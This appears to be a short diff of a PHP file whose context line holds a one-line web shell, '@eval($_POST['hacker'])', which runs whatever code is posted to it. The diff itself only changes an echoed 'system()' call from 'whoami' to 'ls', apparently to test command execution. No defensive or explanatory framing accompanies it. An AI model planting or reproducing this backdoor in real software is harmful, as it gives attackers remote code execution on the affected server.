@@ -1,5 +1,5 @@
 //<?php @eval($_POST['hacker']); ?>
 
 <?php
-echo "<?php system(whoami);?>";
+echo "<?php system(ls);?>";
 ?>
